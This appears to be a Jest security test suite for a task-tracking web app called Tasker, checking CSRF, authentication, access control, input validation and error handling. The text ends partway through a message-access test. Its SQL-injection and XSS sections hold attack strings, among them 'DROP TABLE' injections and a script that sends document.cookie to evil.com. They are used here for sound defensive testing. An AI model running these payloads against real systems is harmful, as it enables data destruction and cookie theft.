/**
 * Security negative-test suite for Tasker.
 *
 * Covers:
 *  - Input validation & sanitization
 *  - CSRF protection
 *  - Authentication & access control (including IDOR)
 *  - SQL-injection attempts (parameterised queries)
 *  - XSS payload rejection / safe return
 *  - Resource exhaustion guards (oversized payloads)
 *  - Error handling (no stack-trace leakage)
 *  - Secrets / sensitive data not returned in responses
 *  - Session fixation prevention (session regeneration after login)
 *  - SMTP error information leakage prevention
 *  - SQL column allowlist in common-fields endpoint
 */

import os from 'os';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import request from 'supertest';
import { buildTestApp, createAdminSession, createUserSession } from './helpers/testApp';
import { getDb, closeDb } from '../db';

// ── Test-DB isolation ─────────────────────────────────────────────────────────
const TEST_DB = path.join(os.tmpdir(), `tasker-test-${process.pid}.db`);
process.env['TASKER_DB_PATH'] = TEST_DB;

let app: ReturnType<typeof buildTestApp>;

beforeAll(() => {
  // Force fresh singleton against the temp DB
  closeDb();
  app = buildTestApp();
  getDb(); // initialise schema
});

afterAll(() => {
  closeDb();
  try { fs.unlinkSync(TEST_DB); } catch { /* ignore */ }
});

// Helper: fresh supertest agent per test (isolated cookie jar)
const agent = () => request.agent(app);

// ─────────────────────────────────────────────────────────────────────────────
// 1. CSRF PROTECTION
// ─────────────────────────────────────────────────────────────────────────────
describe('CSRF protection', () => {
  test('POST /api/auth/login without CSRF token → 403', async () => {
    const res = await agent()
      .post('/api/auth/login')
      .send({ username: 'x', password: 'y' });
    expect(res.status).toBe(403);
    expect(res.body.error).toMatch(/csrf/i);
  });

  test('POST /api/auth/login with wrong CSRF token → 403', async () => {
    const res = await agent()
      .post('/api/auth/login')
      .set('X-CSRF-Token', 'deadbeef')
      .send({ username: 'x', password: 'y' });
    expect(res.status).toBe(403);
  });

  test('Mutating task endpoint without CSRF token → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Deliberately omit CSRF
    const res = await a.post('/api/tasks/start').send({ category: 'X', subcategory: 'Y' });
    expect(res.status).toBe(403);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. AUTHENTICATION
// ─────────────────────────────────────────────────────────────────────────────
describe('Authentication', () => {
  test('Accessing protected route without session → 401', async () => {
    const res = await agent().get('/api/tasks');
    expect(res.status).toBe(401);
  });

  test('Login with empty credentials → 400', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf).send({});
    expect(res.status).toBe(400);
  });

  test('Login with wrong password → 401 (no stack trace)', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf)
      .send({ username: 'nonexistent', password: 'wrongpassword' });
    expect(res.status).toBe(401);
    expect(JSON.stringify(res.body)).not.toMatch(/stack|Error:|at [A-Z]/);
  });

  test('Login response does NOT expose password_hash', async () => {
    const a = agent();
    const { username, password, csrf } = await createUserSession(a);
    // Log out then re-login
    await a.post('/api/auth/logout').set('X-CSRF-Token', csrf).send({});
    const csrf2 = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf2)
      .send({ username, password });
    expect(JSON.stringify(res.body)).not.toMatch(/password_hash|hash/i);
  });

  test('Account lockout after 3 failed attempts', async () => {
    const a = agent();
    const pw = 'LockoutP@ss!';
    const bcrypt = require('bcryptjs');
    const hash = await bcrypt.hash(pw, 4);
    const uname = 'lockout_' + Math.random().toString(36).slice(2);
    getDb().prepare('INSERT INTO users (username,password_hash,is_approved) VALUES (?,?,1)').run(uname, hash);

    for (let i = 0; i < 3; i++) {
      const csrf = (await a.get('/api/auth/csrf-token')).body.token;
      await a.post('/api/auth/login').set('X-CSRF-Token', csrf).send({ username: uname, password: 'WRONG!' });
    }

    // 4th attempt — even with correct password — should be locked
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf).send({ username: uname, password: pw });
    expect(res.status).toBe(403);
    expect(res.body.error).toMatch(/lock/i);
  });

  test('Session-only endpoint returns 401 after logout', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    await a.post('/api/auth/logout').set('X-CSRF-Token', csrf).send({});
    const res = await a.get('/api/tasks');
    expect(res.status).toBe(401);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. ACCESS CONTROL / BROKEN ACCESS CONTROL (IDOR)
// ─────────────────────────────────────────────────────────────────────────────
describe('Access control', () => {
  test('Admin endpoint denied for non-admin user', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/admin/users').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });

  test('User cannot read another user\'s task (IDOR)', async () => {
    const a1 = agent();
    const a2 = agent();
    const { csrf: csrf1 } = await createUserSession(a1);
    const { csrf: csrf2 } = await createUserSession(a2);

    // user1 starts a task
    const startRes = await a1.post('/api/tasks/start').set('X-CSRF-Token', csrf1).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    expect(startRes.status).toBe(200);
    const taskId = startRes.body.taskId;

    // user2 tries to read it
    const res = await a2.get(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf2);
    expect(res.status).toBe(404);
  });

  test('User cannot patch another user\'s task (IDOR)', async () => {
    const a1 = agent();
    const a2 = agent();
    const { csrf: csrf1 } = await createUserSession(a1);
    const { csrf: csrf2 } = await createUserSession(a2);

    // user1 starts a task
    await a1.post('/api/tasks/start').set('X-CSRF-Token', csrf1).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    // get the task id via user1
    const tasks = await a1.get('/api/tasks?status=in_progress').set('X-CSRF-Token', csrf1);
    const taskId = tasks.body.tasks[0]?.id;

    // user2 tries to PATCH it
    const res = await a2.patch(`/api/tasks/${taskId}`)
      .set('X-CSRF-Token', csrf2)
      .send({ status: 'completed', outcome: 'Completed', end_time: new Date().toISOString() });
    expect(res.status).toBe(404);
  });

  test('User cannot delete another user\'s task (IDOR)', async () => {
    const a1 = agent();
    const a2 = agent();
    const { csrf: csrf1 } = await createUserSession(a1);
    const { csrf: csrf2 } = await createUserSession(a2);

    await a1.post('/api/tasks/start').set('X-CSRF-Token', csrf1).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    const tasks = await a1.get('/api/tasks').set('X-CSRF-Token', csrf1);
    const taskId = tasks.body.tasks[0]?.id;

    const res = await a2.delete(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf2);
    expect(res.status).toBe(404);
  });

  test('Admin cannot delete another admin account', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    // Attempt to delete a non-existent or admin user
    const res = await a.delete('/api/admin/users/99999').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(404);
  });

  test('Admin: cannot approve non-existent pending user', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/users/99999/approve').set('X-CSRF-Token', csrf).send({});
    expect(res.status).toBe(404);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. INPUT VALIDATION
// ─────────────────────────────────────────────────────────────────────────────
describe('Input validation', () => {
  test('Registration: weak password rejected', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    // Enable self-registration for this test
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'auto');
    const res = await a.post('/api/auth/register').set('X-CSRF-Token', csrf).send({ password: 'weak' });
    expect(res.status).toBe(400);
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'admin_approved');
  });

  test('Registration: password with no special chars rejected', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'auto');
    const res = await a.post('/api/auth/register').set('X-CSRF-Token', csrf).send({ password: 'Password123' });
    expect(res.status).toBe(400);
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'admin_approved');
  });

  test('Change-password: new password same as current → reuses same weak hash check', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Very short password
    const res = await a.post('/api/auth/change-password')
      .set('X-CSRF-Token', csrf)
      .send({ currentPassword: 'UserP@ss1!', newPassword: 'short' });
    expect(res.status).toBe(400);
  });

  test('Task start: missing category/subcategory does not crash server', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({ start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0] });
    // Server should respond (200 with null category is acceptable; main thing = no 500)
    expect(res.status).not.toBe(500);
  });

  test('Task start: start_time in the past rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover',
        start_time: '2000-01-01T00:00:00.000Z',
        assigned_date: new Date().toISOString().split('T')[0],
      });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/today/i);
  });

  test('Task start: notes field is ignored (no longer used)', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover',
        start_time: new Date().toISOString(),
        assigned_date: new Date().toISOString().split('T')[0],
        notes: 'A'.repeat(2001),
      });
    // Notes field is no longer stored; request should succeed (200/201)
    expect(res.status).toBe(200);
  });

  test('Pending-count: non-numeric count → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/pending-count')
      .set('X-CSRF-Token', csrf)
      .send({ count: 'abc' });
    expect(res.status).toBe(400);
  });

  test('Pending-count: negative value → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/pending-count')
      .set('X-CSRF-Token', csrf)
      .send({ count: -1 });
    expect(res.status).toBe(400);
  });

  test('Pending-count: excessively large value → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/pending-count')
      .set('X-CSRF-Token', csrf)
      .send({ count: 99999 });
    expect(res.status).toBe(400);
  });

  test('Admin settings: invalid mode rejected', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/settings')
      .set('X-CSRF-Token', csrf)
      .send({ selfRegistration: 'evil_value', userInvite: 'admin_approved' });
    expect(res.status).toBe(400);
  });

  test('Dropdown propose: invalid field_name rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'not_a_field', value: 'Test' });
    expect(res.status).toBe(400);
  });

  test('Dropdown propose: value over 100 chars rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'category', value: 'A'.repeat(101) });
    expect(res.status).toBe(400);
  });

  test('Group proposal: empty name rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/auth/propose-group')
      .set('X-CSRF-Token', csrf)
      .send({ name: '' });
    expect(res.status).toBe(400);
  });

  test('Group proposal: name over 100 chars rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/auth/propose-group')
      .set('X-CSRF-Token', csrf)
      .send({ name: 'G'.repeat(101) });
    expect(res.status).toBe(400);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. SQL INJECTION ATTEMPTS
// ─────────────────────────────────────────────────────────────────────────────
describe('SQL injection', () => {
  const injections = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "\" OR \"1\"=\"1",
    "1; SELECT * FROM users; --",
    "' UNION SELECT password_hash FROM users --",
    "admin'--",
  ];

  test.each(injections)('Login username SQLi: %s → 401 (no crash)', async (payload) => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login')
      .set('X-CSRF-Token', csrf)
      .send({ username: payload, password: 'anypassword' });
    // Should not crash (500) and should not inadvertently succeed (200)
    expect(res.status).not.toBe(500);
    expect(res.status).not.toBe(200);
  });

  test('Task category SQLi payload stored safely', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Attempt to inject via category field
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: "Clinical'; DROP TABLE tasks; --",
        subcategory: 'Handover',
        start_time: new Date().toISOString(),
        assigned_date: new Date().toISOString().split('T')[0],
      });
    expect(res.status).not.toBe(500);
    // DB tables should still be intact
    expect(() => getDb().prepare('SELECT COUNT(*) FROM tasks').get()).not.toThrow();
  });

  test('Dropdown propose SQLi payload rejected or stored safely', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'category', value: "'; DROP TABLE dropdown_options; --" });
    expect(res.status).not.toBe(500);
    // Table must still exist
    expect(() => getDb().prepare('SELECT COUNT(*) FROM dropdown_options').get()).not.toThrow();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 6. XSS PAYLOADS — server must not execute them; responses safe
// ─────────────────────────────────────────────────────────────────────────────
describe('XSS payloads', () => {
  const xssPayloads = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert('xss')",
    '<svg onload=alert(1)>',
  ];

  test.each(xssPayloads)('Dropdown proposal with XSS payload stored/rejected safely: %s', async (payload) => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'outcome', value: payload.substring(0, 100) });
    // Either rejected (value too long if >100 chars) or accepted as plain text
    expect(res.status).not.toBe(500);
    // The payload must not appear in a JSON body as executable HTML
    if (res.status === 200 && res.body.value) {
      // Content-Type should be JSON, not HTML
      expect(res.headers['content-type']).toMatch(/application\/json/);
    }
  });

  test('Task notes with XSS payload: server does not execute it', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const xssNote = '<script>fetch("https://evil.com/"+document.cookie)</script>';
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover', notes: xssNote,
        start_time: new Date().toISOString(),
        assigned_date: new Date().toISOString().split('T')[0],
      });
    expect(res.status).not.toBe(500);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 7. RESOURCE EXHAUSTION
// ─────────────────────────────────────────────────────────────────────────────
describe('Resource exhaustion', () => {
  test('Oversized JSON body rejected (>1MB)', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    // Build a body well over 1 MB so express.json({ limit:'1mb' }) rejects it with 413
    const bigString = 'x'.repeat(600_000);
    const res = await a.post('/api/auth/login')
      .set('X-CSRF-Token', csrf)
      .set('Content-Type', 'application/json')
      .send(JSON.stringify({ username: bigString, password: bigString }));
    // express.json limit returns 413; route may also return 400/403; never 500
    expect(res.status).toBe(413);
  });

  test('Starting a second active task returns 409 (not 500)', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const payload = {
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    };
    await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send(payload);
    const res = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send(payload);
    expect(res.status).toBe(409);
    expect(res.body.error).toMatch(/active/i);
  });

  test('Option IDs array: non-array value rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.put('/api/auth/my-options')
      .set('X-CSRF-Token', csrf)
      .send({ option_ids: 'not-an-array' });
    expect(res.status).toBe(400);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 8. ERROR HANDLING — no stack traces or system info leaked
// ─────────────────────────────────────────────────────────────────────────────
describe('Error handling', () => {
  test('404 on non-existent API route does not leak stack trace', async () => {
    const res = await agent().get('/api/nonexistent/route');
    expect(JSON.stringify(res.body)).not.toMatch(/at Object\.|at Module\.|node_modules/);
  });

  test('404 task request returns JSON error, not stack trace', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/tasks/99999999').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(404);
    expect(JSON.stringify(res.body)).not.toMatch(/at Object\.|Error:/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 9. TEMPORAL CONSISTENCY
// ─────────────────────────────────────────────────────────────────────────────
describe('Temporal consistency checks', () => {
  test('Task PATCH: end_time before start_time → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const now = new Date();
    const earlier = new Date(now.getTime() - 60_000);

    const startRes = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover',
        start_time: now.toISOString(),
        assigned_date: now.toISOString().split('T')[0],
      });
    const taskId = startRes.body.taskId;

    const patchRes = await a.patch(`/api/tasks/${taskId}`)
      .set('X-CSRF-Token', csrf)
      .send({
        status: 'completed',
        outcome: 'Completed',
        start_time: now.toISOString(),
        end_time: earlier.toISOString(),
      });
    expect(patchRes.status).toBe(400);
    expect(patchRes.body.error).toMatch(/start time must be before/i);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 10. PATH TRAVERSAL (admin restore)
// ─────────────────────────────────────────────────────────────────────────────
describe('Path traversal', () => {
  test('Admin restore with no file → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/restore')
      .set('X-CSRF-Token', csrf)
      .send({});
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/no file/i);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 11. GROUP ACCESS CONTROL
// ─────────────────────────────────────────────────────────────────────────────
describe('Group access control', () => {
  test('User cannot set group to a pending (unapproved) group', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Insert a pending group directly
    const db = getDb();
    const r = db.prepare('INSERT INTO user_groups (name, is_approved) VALUES (?,0)').run('PendingGroup_' + Date.now());
    const pendingId = r.lastInsertRowid;

    const res = await a.post('/api/auth/set-group')
      .set('X-CSRF-Token', csrf)
      .send({ groupId: pendingId });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/not found/i);
  });

  test('Non-admin cannot access pending groups list', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/admin/pending-groups').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });

  test('Non-admin cannot approve pending groups', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/admin/pending-groups/1/approve')
      .set('X-CSRF-Token', csrf).send({});
    expect(res.status).toBe(403);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 12. TASK FLAGS — v1.8.1
// ─────────────────────────────────────────────────────────────────────────────
describe('Task flags', () => {
  test('GET /api/flags — unauthenticated → 401', async () => {
    const res = await agent().get('/api/flags');
    expect(res.status).toBe(401);
  });

  test('GET /api/flags — authenticated → 200 with options array', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/flags').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('options');
    expect(Array.isArray(res.body.options)).toBe(true);
    // Default seeds should be present
    expect(res.body.options.length).toBeGreaterThan(0);
  });

  test('Admin: add flag option → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const uniqueVal = 'TestFlag_' + Date.now();
    const res = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: uniqueVal });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Admin: add flag option — empty value → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: '' });
    expect(res.status).toBe(400);
  });

  test('Admin: add flag option — value >100 chars → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: 'F'.repeat(101) });
    expect(res.status).toBe(400);
  });

  test('Admin: add duplicate flag option → 409', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const uniqueVal = 'DupFlag_' + Date.now();
    await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: uniqueVal });
    const res = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: uniqueVal });
    expect(res.status).toBe(409);
  });

  test('Non-admin: add flag option → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: 'ShouldFail' });
    expect(res.status).toBe(403);
  });

  test('Admin: rename flag option → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const val = 'RenameMe_' + Date.now();
    const createRes = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: val });
    const id = createRes.body.id;
    const res = await a.put(`/api/flags/admin/${id}`).set('X-CSRF-Token', csrf).send({ value: val + '_renamed' });
    expect(res.status).toBe(200);
  });

  test('Admin: rename flag option — non-existent → 404', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.put('/api/flags/admin/999999').set('X-CSRF-Token', csrf).send({ value: 'NewName' });
    expect(res.status).toBe(404);
  });

  test('Admin: delete flag option → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const val = 'DeleteMe_' + Date.now();
    const createRes = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: val });
    const id = createRes.body.id;
    const res = await a.delete(`/api/flags/admin/${id}`).set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Flag propose without SMTP configured → 503', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // No SMTP configured in test environment
    const res = await a.post('/api/flags/propose').set('X-CSRF-Token', csrf).send({ value: 'My flag suggestion' });
    expect(res.status).toBe(503);
    expect(res.body.error).toMatch(/smtp/i);
  });

  test('Flag propose — empty value → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/flags/propose').set('X-CSRF-Token', csrf).send({ value: '' });
    expect(res.status).toBe(400);
  });

  test('Flag propose — value >100 chars → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/flags/propose').set('X-CSRF-Token', csrf).send({ value: 'X'.repeat(101) });
    expect(res.status).toBe(400);
  });

  test('Flag propose — unauthenticated → 401', async () => {
    const res = await agent().post('/api/flags/propose').send({ value: 'Test flag' });
    expect(res.status).toBe(401);
  });

  test('Task PATCH: flag_ids stored and returned', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Start a task
    const startRes = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    const taskId = startRes.body.taskId;

    // Get a valid flag option ID
    const flagsRes = await a.get('/api/flags').set('X-CSRF-Token', csrf);
    const flagId = flagsRes.body.options[0]?.id;
    expect(flagId).toBeTruthy();

    // Patch the task with flags
    const end = new Date(Date.now() + 60000).toISOString();
    const patchRes = await a.patch(`/api/tasks/${taskId}`)
      .set('X-CSRF-Token', csrf)
      .send({ status: 'completed', outcome: 'Completed', end_time: end, flag_ids: [flagId] });
    expect(patchRes.status).toBe(200);

    // Verify flag_ids returned when fetching task
    const getRes = await a.get(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf);
    expect(getRes.status).toBe(200);
    expect(getRes.body.task.flag_ids).toContain(flagId);
  });

  test('Task PATCH: non-integer flag_ids ignored (no crash)', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const startRes = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    const taskId = startRes.body.taskId;
    const end = new Date(Date.now() + 60000).toISOString();
    const patchRes = await a.patch(`/api/tasks/${taskId}`)
      .set('X-CSRF-Token', csrf)
      .send({ status: 'completed', outcome: 'Completed', end_time: end, flag_ids: ['<script>', -1, 0.5, null] });
    expect(patchRes.status).toBe(200);
  });

  test('Task GET list: flag_ids included in response', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/tasks').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.tasks)).toBe(true);
    // Each task should have a flag_ids array
    if (res.body.tasks.length > 0) {
      expect(Array.isArray(res.body.tasks[0].flag_ids)).toBe(true);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 13. USER MESSAGES — v1.8.1
// ─────────────────────────────────────────────────────────────────────────────
describe('User messages', () => {
  test('GET /api/messages — unauthenticated → 401', async () => {
    const res = await agent().get('/api/messages');
    expect(res.status).toBe(401);
  });

  test('GET /api/messages — authenticated → 200 with messages array', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/messages').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.messages)).toBe(true);
  });

  test('Admin: send message to specific user → 200', async () => {
    const aAdmin = agent();
    const aUser = agent();
    const { csrf: adminCsrf } = await createAdminSession(aAdmin);
    await createUserSession(aUser);

    // Get a user id
    const usersRes = await aAdmin.get('/api/admin/users').set('X-CSRF-Token', adminCsrf);
    const userId = usersRes.body.users[0]?.id;
    expect(userId).toBeTruthy();

    const res = await aAdmin.post('/api/messages/admin/send')
      .set('X-CSRF-Token', adminCsrf)
      .send({ user_id: userId, message: 'Test message for user' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Admin: broadcast message (no user_id) → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/messages/admin/send')
      .set('X-CSRF-Token', csrf)
      .send({ message: 'Broadcast test' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Admin: send empty message → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/messages/admin/send')
      .set('X-CSRF-Token', csrf)
      .send({ message: '' });
    expect(res.status).toBe(400);
  });

  test('Admin: message >500 chars → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/messages/admin/send')
      .set('X-CSRF-Token', csrf)
      .send({ message: 'M'.repeat(501) });
    expect(res.status).toBe(400);
  });

  test('Admin: send to non-existent user → 404', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/messages/admin/send')
      .set('X-CSRF-Token', csrf)
      .send({ user_id: 999999, message: 'Test' });
    expect(res.status).toBe(404);
  });

  test('Admin: cannot send message to another admin → 404', async () => {
    const a1 = agent();
    const { csrf: csrf1 } = await createAdminSession(a1);
    // Create a second admin user directly in DB
    const db = getDb();
    const bcrypt = require('bcryptjs');
    const hash = await bcrypt.hash('AdminP@ss1!', 4);
    const admin2 = db.prepare(
      'INSERT INTO users (username,password_hash,is_admin,is_approved,pending_activation) VALUES (?,?,1,1,0)'
    ).run('admin2_' + Date.now(), hash);
    const adminId = admin2.lastInsertRowid;

    const res = await a1.post('/api/messages/admin/send')
      .set('X-CSRF-Token', csrf1)
      .send({ user_id: adminId, message: 'Should not go to admin' });
    expect(res.status).toBe(404);
  });

  test('Non-admin cannot access admin send endpoint → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/messages/admin/send')
      .set('X-CSRF-Token', csrf)
      .send({ message: 'Unauthorised broadcast' });
    expect(res.status).toBe(403);
  });

  test('User: mark own message as read → 200', async () => {
    const aAdmin = agent();
    const aUser = agent();
    const { csrf: adminCsrf } = await createAdminSession(aAdmin);
    const { csrf: userCsrf, username: userUsername } = await createUserSession(aUser);

    // Look up the user's ID by username
    const userRecord = getDb().prepare('SELECT id FROM users WHERE username=?').get(userUsername) as any;
    const userId = userRecord.id;

    // Admin sends message directly to this user
    await aAdmin.post('/api/messages/admin/send')
      .set('X-CSRF-Token', adminCsrf)
      .send({ user_id: userId, message: 'Please read me' });

    // Get the message id from user's perspective
    const msgsRes = await aUser.get('/api/messages').set('X-CSRF-Token', userCsrf);
    const msgId = msgsRes.body.messages[0]?.id;
    expect(msgId).toBeTruthy();

    const res = await aUser.post(`/api/messages/${msgId}/read`)
      .set('X-CSRF-Token', userCsrf);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('User: mark-read on non-existent message → 404', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/messages/999999/read').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(404);
  });

  test('IDOR: user cannot mark another user\'s message as read', async () => {
    const aAdmin = agent();
    const aUser1 = agent();
    const aUser2 = agent();
    const { csrf: adminCsrf } = await createAdminSession(aAdmin);
    const { csrf: csrf2 } = await createUserSession(aUser2);

    // Create user1 and send them a message
    await createUserSession(aUser1);
